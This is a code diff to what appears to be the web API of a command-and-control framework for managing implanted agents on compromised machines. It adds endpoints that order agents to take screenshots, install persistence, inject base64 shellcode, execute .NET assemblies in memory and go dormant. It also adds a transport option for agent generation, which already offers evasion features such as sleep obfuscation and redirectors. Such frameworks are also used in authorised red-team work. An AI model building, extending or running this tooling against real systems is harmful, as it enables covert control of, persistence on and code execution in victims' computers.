@@ -247,7 +247,7 @@ async def postex(agent_id: str, req: PostexRequest):
     if not _server or agent_id not in _server.agents:
         raise HTTPException(404, "Agent not found")
     op = (req.op or "").strip()
-    if op not in ("ps", "recon", "download", "upload"):
+    if op not in ("ps", "recon", "download", "upload", "screenshot"):
         raise HTTPException(400, "Unknown postex op")
     if op == "download":
         command = "__px:download:" + req.path
@@ -256,6 +256,71 @@ async def postex(agent_id: str, req: PostexRequest):
     else:
         command = "__px:" + op
     result = await _server.send_command_to_agent(agent_id, command)
+    return {"output": result}
+
+
+class PersistRequest(BaseModel):
+    method: str = ""
+
+
+class ShinjectRequest(BaseModel):
+    shellcode_b64: str
+
+
+class AssemblyRequest(BaseModel):
+    assembly_b64: str
+    args: str = ""
+
+
+class DormantRequest(BaseModel):
+    duration: str
+
+
+@router.post("/agents/{agent_id}/persist")
+async def persist_agent(agent_id: str, req: PersistRequest):
+    if not _server or agent_id not in _server.agents:
+        raise HTTPException(404, "Agent not found")
+    command = f"persist {req.method}".strip()
+    result = await _server.send_command_to_agent(agent_id, command)
+    agent = _server.agents.get(agent_id)
+    if agent and agent.mode == "beacon":
+        return {"queued": True, "message": result}
+    return {"output": result}
+
+
+@router.post("/agents/{agent_id}/shinject")
+async def shinject_agent(agent_id: str, req: ShinjectRequest):
+    if not _server or agent_id not in _server.agents:
+        raise HTTPException(404, "Agent not found")
+    command = f"__shinject:{req.shellcode_b64}"
+    result = await _server.send_command_to_agent(agent_id, command)
+    agent = _server.agents.get(agent_id)
+    if agent and agent.mode == "beacon":
+        return {"queued": True, "message": result}
+    return {"output": result}
+
+
+@router.post("/agents/{agent_id}/execute-assembly")
+async def execute_assembly_agent(agent_id: str, req: AssemblyRequest):
+    if not _server or agent_id not in _server.agents:
+        raise HTTPException(404, "Agent not found")
+    command = f"__asm:{req.args}:{req.assembly_b64}"
+    result = await _server.send_command_to_agent(agent_id, command)
+    agent = _server.agents.get(agent_id)
+    if agent and agent.mode == "beacon":
+        return {"queued": True, "message": result}
+    return {"output": result}
+
+
+@router.post("/agents/{agent_id}/dormant")
+async def dormant_agent(agent_id: str, req: DormantRequest):
+    if not _server or agent_id not in _server.agents:
+        raise HTTPException(404, "Agent not found")
+    command = f"dormant {req.duration}"
+    result = await _server.send_command_to_agent(agent_id, command)
+    agent = _server.agents.get(agent_id)
+    if agent and agent.mode == "beacon":
+        return {"queued": True, "message": result}
     return {"output": result}
 
 
@@ -372,6 +437,7 @@ async def generate_agents(req: GenerateRequest):
             sleep_obf=req.sleep_obf, idle_encrypt=req.idle_encrypt,
             profile=req.profile, target_os=req.target_os, redirector=req.redirector,
             bof=req.bof, obfuscation=req.obfuscation,
+            transport=transport,
         )
         results.update(py_results)
 
